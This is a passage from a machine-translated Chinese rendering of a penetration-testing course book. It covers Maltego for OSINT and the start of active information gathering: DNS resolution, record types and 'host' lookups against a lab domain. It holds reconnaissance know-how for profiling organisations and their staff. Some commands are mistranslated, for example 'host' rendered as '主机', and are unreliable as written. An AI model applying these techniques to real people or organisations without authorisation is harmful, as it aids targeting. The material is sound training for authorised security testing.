<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:200409;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Maltego </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">186</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个非常强大的数据挖掘工具，它提供了无穷无尽的搜索工具组合</font></font></nobr></div>
<div style="position:absolute;top:200429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和策略。</font><font style="vertical-align: inherit;">它的学习曲线可能很陡峭，坦率地说，对于这个模块来说，这有点矫枉过正，但是</font></font></nobr></div>
<div style="position:absolute;top:200448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其令人印象深刻的能力值得介绍。</font></font></nobr></div>
<div style="position:absolute;top:200481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Maltego 搜索了数千个在线数据源，并使用极其巧妙的“转换”来</font></font></nobr></div>
<div style="position:absolute;top:200500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将一条信息转换为另一条信息。</font><font style="vertical-align: inherit;">例如，如果我们正在执行用户信息</font></font></nobr></div>
<div style="position:absolute;top:200520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">收集活动，我们可以提交一个电子邮件地址，并通过各种自动搜索，</font></font></nobr></div>
<div style="position:absolute;top:200539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将其“转换”为关联的电话号码或街道地址。</font><font style="vertical-align: inherit;">在组织期间</font></font></nobr></div>
<div style="position:absolute;top:200558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息收集练习，我们可以提交一个域名并将其“转换”为一个网络</font></font></nobr></div>
<div style="position:absolute;top:200578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器，然后是电子邮件地址列表，然后是关联的社交媒体帐户列表，然后进入</font></font></nobr></div>
<div style="position:absolute;top:200597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该电子邮件帐户的潜在密码列表。</font></font></nobr></div>
<div style="position:absolute;top:200630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组合是无穷无尽的，所发现的信息以可扩展的图形呈现</font></font></nobr></div>
<div style="position:absolute;top:200649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许轻松的缩放和平移导航。</font></font></nobr></div>
<div style="position:absolute;top:200682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Maltego CE（Maltego 的有限“社区版”）包含在 Kali 中，需要一个免费的</font></font></nobr></div>
<div style="position:absolute;top:200701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册使用。</font><font style="vertical-align: inherit;">商业版本也可用，可以处理更大的数据集。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:200819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">186 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帕特瓦，2019 年），https://www.paterva.com/buy/maltego-clients.php</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:200947;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="170"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 170 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:200980;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:202057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:202057;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:202057;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">170</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:201076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多个供应商提供 Maltgo 可以摄取和显示的信息。</font><font style="vertical-align: inherit;">然而，一些供应商</font></font></nobr></div>
<div style="position:absolute;top:201095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还对访问他们的数据收费。</font><font style="vertical-align: inherit;">Maltego 不需要在实验室完成任何材料，</font></font></nobr></div>
<div style="position:absolute;top:201114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但它可以成为大型信息收集操作不可或缺的工具。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:201152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.16 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:201193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们探讨了被动信息迭代过程的基本方面</font></font></nobr></div>
<div style="position:absolute;top:201213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜集。</font><font style="vertical-align: inherit;">我们介绍了各种技术和工具来定位公司信息</font></font></nobr></div>
<div style="position:absolute;top:201232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和他们的员工。</font><font style="vertical-align: inherit;">这些信息通常可以证明在后期阶段是无价的</font></font></nobr></div>
<div style="position:absolute;top:201251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">订婚。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:202135;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="171"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 171 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:202168;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:203245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:203245;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:203245;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">171</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:202258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.16.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:202284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7. 主动信息收集</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:202328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们将超越被动的信息收集并探索能够</font></font></nobr></div>
<div style="position:absolute;top:202348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">涉及与目标服务的直接交互。</font><font style="vertical-align: inherit;">我们将看看一些基础技术</font></font></nobr></div>
<div style="position:absolute;top:202367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但请记住，该领域有无数服务可以作为目标。</font><font style="vertical-align: inherit;">这包括</font></font></nobr></div>
<div style="position:absolute;top:202386;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们在一个单独的模块中更详细地介绍了</font><i><font style="vertical-align: inherit;">Active Directory</font></i><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">然而，我们将</font></font></nobr></div>
<div style="position:absolute;top:202406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看本模块中一些更常见的主动信息收集技术，包括</font></font></nobr></div>
<div style="position:absolute;top:202425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口扫描和 DNS、SMB、NFS、SMTP 和 SNMP 枚举。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:202462;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1 DNS 枚举</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:202504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域名系统 (DNS) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">187</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 Internet 上最关键的系统之一，是</font></font></nobr></div>
<div style="position:absolute;top:202523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">负责将用户友好的域名转换为 IP 地址的分布式数据库。</font></font></nobr></div>
<div style="position:absolute;top:202556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是由分为几个区域的层次结构促进的，从顶部开始</font></font></nobr></div>
<div style="position:absolute;top:202576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">水平根区。</font><font style="vertical-align: inherit;">让我们仔细看看解析主机名所涉及的过程和服务器</font></font></nobr></div>
<div style="position:absolute;top:202595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如 www.megacorpone.com。</font></font></nobr></div>
<div style="position:absolute;top:202628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当主机名输入浏览器或其他应用程序时，该过程开始。</font><font style="vertical-align: inherit;">浏览器</font></font></nobr></div>
<div style="position:absolute;top:202647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将主机名传递给操作系统的 DNS 客户端，然后操作系统转发</font></font></nobr></div>
<div style="position:absolute;top:202666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对其配置使用的外部 DNS 服务器的请求。</font><font style="vertical-align: inherit;">链中的第一个服务器是已知的</font></font></nobr></div>
<div style="position:absolute;top:202686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNS 递归者</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，负责与 DNS 基础设施交互并返回</font></font></nobr></div>
<div style="position:absolute;top:202705;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将结果发送给 DNS 客户端。</font><font style="vertical-align: inherit;">DNS 递归器联系 DNS 根区域中的服务器之一。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:202724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后根服务器以负责包含该区域的服务器的地址作为响应</font></font></nobr></div>
<div style="position:absolute;top:202744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">顶级域 (TLD)，</font><font style="vertical-align: inherit;">在这种情况下为</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">188</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，即</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.com</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> TLD。</font></font></nobr></div>
<div style="position:absolute;top:202776;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦 DNS 递归器收到 TLD DNS 服务器的地址，它就会向其查询</font></font></nobr></div>
<div style="position:absolute;top:202796;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com 域的权威域名服务器。</font><font style="vertical-align: inherit;">权威域名服务器是</font></font></nobr></div>
<div style="position:absolute;top:202815;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNS 查找过程的最后一步，包含已知本地数据库中的 DNS 记录</font></font></nobr></div>
<div style="position:absolute;top:202834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为区域文件。</font><font style="vertical-align: inherit;">它通常为每个域托管两个区域，即使用的正向查找区域</font></font></nobr></div>
<div style="position:absolute;top:202854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查找特定主机名的 IP 地址和反向查找区域（如果由</font></font></nobr></div>
<div style="position:absolute;top:202873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员），用于查找特定 IP 地址的主机名。</font><font style="vertical-align: inherit;">一旦 DNS 递归</font></font></nobr></div>
<div style="position:absolute;top:202893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向DNS客户端提供www.megacorpone.com的IP地址，浏览器可以联系</font></font></nobr></div>
<div style="position:absolute;top:202912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正确的网络服务器在其 IP 地址并加载网页。</font></font></nobr></div>
<div style="position:absolute;top:202945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了提高 DNS 的性能和可靠性，DNS 缓存用于存储本地副本</font></font></nobr></div>
<div style="position:absolute;top:202964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查找过程各个阶段的 DNS 记录。</font><font style="vertical-align: inherit;">正是因为这个原因，一些现代</font></font></nobr></div>
<div style="position:absolute;top:202983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序（例如 Web 浏览器）保留单独的 DNS 缓存。</font><font style="vertical-align: inherit;">另外，本地DNS客户端</font></font></nobr></div>
<div style="position:absolute;top:203003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统还维护自己的 DNS 缓存以及每个 DNS 服务器</font></font></nobr></div>
<div style="position:absolute;top:203022;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查找过程。</font><font style="vertical-align: inherit;">域所有者还可以控制服务器或客户端缓存 DNS 的时间</font></font></nobr></div>
<div style="position:absolute;top:203041;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过</font><font style="vertical-align: inherit;">DNS 记录的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生存时间</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(TTL) 字段记录。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:203175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">187 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Domain_Name_System</font></font></font></nobr></div>
<div style="position:absolute;top:203195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">188 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Top-level_domain</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:203323;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="172"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 172 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:203356;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:204433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:204433;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:204433;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">172</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:203452;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.1 与 DNS 服务器交互</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:203490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个域可以使用不同类型的 DNS 记录。</font><font style="vertical-align: inherit;">一些最常见的 DNS 类型</font></font></nobr></div>
<div style="position:absolute;top:203509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">记录包括：</font></font></nobr></div>
<div style="position:absolute;top:203542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:203542;left:145"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NS</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - 名称服务器记录包含托管 DNS 的权威服务器的名称</font></font></nobr></div>
<div style="position:absolute;top:203562;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域的记录。</font></font></nobr></div>
<div style="position:absolute;top:203590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:203590;left:145"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - 也称为主机记录，“ </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">a 记录</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">”包含主机名的 IP 地址（例如</font></font></nobr></div>
<div style="position:absolute;top:203609;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如 www.megacorpone.com）。</font></font></nobr></div>
<div style="position:absolute;top:203637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:203637;left:145"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MX</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - 邮件交换记录包含负责处理电子邮件的服务器的名称</font></font></nobr></div>
<div style="position:absolute;top:203657;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为域。</font><font style="vertical-align: inherit;">一个域可以包含多个 MX 记录。</font></font></nobr></div>
<div style="position:absolute;top:203685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:203685;left:145"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PTR</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - 指针记录用于反向查找区域并用于查找记录</font></font></nobr></div>
<div style="position:absolute;top:203705;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 IP 地址相关联。</font></font></nobr></div>
<div style="position:absolute;top:203733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:203733;left:145"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CNAME</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - 规范名称记录用于为其他主机记录创建别名。</font></font></nobr></div>
<div style="position:absolute;top:203761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:203761;left:145"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TXT</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - 文本记录可以包含任何任意数据并可用于各种目的，</font></font></nobr></div>
<div style="position:absolute;top:203780;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如域所有权验证。</font></font></nobr></div>
<div style="position:absolute;top:203813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 DNS 中包含的信息丰富，它通常是活跃的目标</font></font></nobr></div>
<div style="position:absolute;top:203833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息收集。</font></font></nobr></div>
<div style="position:absolute;top:203865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了演示这一点，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">host</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令来查找 IP 地址</font></font></nobr></div>
<div style="position:absolute;top:203885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www.megacorpone.com:</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:203920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机 www.megacorpone.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:203937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www.megacorpone.com 的地址为 38.100.193.76</font></font></nobr></div>
<div style="position:absolute;top:203956;left:238"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 210 - 使用 host 查找 www.megacorpone.com 的 A 主机记录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:203985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，host命令查找</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">记录，但我们也可以查询其他字段，比如MX</font></font></nobr></div>
<div style="position:absolute;top:204005;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或 TXT 记录。</font><font style="vertical-align: inherit;">为此，我们可以使用 -t 选项来指定我们要查找的记录类型：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:204039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">host -t mx megacorpone.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:204057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com 邮件由 10 fb.mail.gandi.net 处理。</font></font></nobr></div>
<div style="position:absolute;top:204074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com 邮件由 50 mail.megacorpone.com 处理。</font></font></nobr></div>
<div style="position:absolute;top:204091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com 邮件由 60 mail2.megacorpone.com 处理。</font></font></nobr></div>
<div style="position:absolute;top:204107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com 邮件由 20 spool.mail.gandi.net 处理。</font></font></nobr></div>
<div style="position:absolute;top:204141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">host -t txt megacorpone.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:204159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">megacorpone.com 描述性文字“努力”</font></font></nobr></div>
<div style="position:absolute;top:204178;left:234"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 211 - 使用主机查找 megacorpone.com 的 MX 和 TXT 记录</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:204209;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.1.2 自动查找</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:204247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们有了来自 megacorpone.com 域的一些初始数据，我们可以继续使用</font></font></nobr></div>
<div style="position:absolute;top:204266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">额外的 DNS 查询以发现更多属于相同的主机名和 IP 地址</font></font></nobr></div>
<div style="position:absolute;top:204286;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域。</font><font style="vertical-align: inherit;">例如，我们知道域有一个 web 服务器，主机名</font></font></nobr></div>
<div style="position:absolute;top:204305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“www.megacorpone.com”。</font></font></nobr></div>
<div style="position:absolute;top:204338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们</font><font style="vertical-align: inherit;">针对这个主机名</font><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:204511;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="173"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 173 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:204544;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:205621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:205621;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:205621;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">173</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:204642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机 www.megacorpone.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:204659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www.megacorpone.com 的地址为 38.100.193.76</font></font></nobr></div>
<div style="position:absolute;top:204678;left:327"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 212 - 使用主机查找有效主机</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:204707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在，让我们看看 megacorpone.com 是否有一个主机名为“idontexist”的服务器。</font><font style="vertical-align: inherit;">请注意</font></font></nobr></div>
<div style="position:absolute;top:204727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查询输出之间的区别：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:204762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机 idontexist.megacorpone.com</font></font></font></b></nobr></div>
<div style="position:absolute;top:204779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机 idontexist.megacorpone.com 未找到：3(NXDOMAIN)</font></font></nobr></div>
<div style="position:absolute;top:204798;left:318"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 213 - 使用主机查找无效主机</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:204827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 212 中，我们查询了一个有效的主机名并收到了一个 IP 解析响应。</font><font style="vertical-align: inherit;">相比之下，</font></font></nobr></div>
